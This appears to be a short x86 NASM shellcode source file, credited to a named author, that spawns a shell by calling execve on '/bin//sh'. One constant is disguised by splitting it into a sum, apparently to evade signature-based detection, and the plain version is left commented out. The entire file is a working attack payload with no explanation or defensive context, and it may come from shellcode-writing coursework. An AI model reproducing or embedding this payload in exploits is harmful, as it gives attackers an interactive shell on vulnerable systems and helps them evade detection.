;Filename:Execve-stack.nasm
;Author:Prateek Gianchandani		
;Email:prateek.searchingeye@gmail.com

global _start

section .text

_start:

	xor eax,eax
	push eax
	
	
	;mov dword [esp -4], 0x68732f2f
	mov esi, 0x57621e1e
	add esi,0x11111111
	mov dword [esp-4],esi
	mov dword [esp -8], 0x6e69622f
  ;	push 0x68732f2f
  ;	push 0x6e69622f 
	

	sub esp, 8
	mov ebx,esp
	
	push eax
	mov edx,esp

	push  ebx
	mov ecx,esp

	mov al,11
	int 0x80


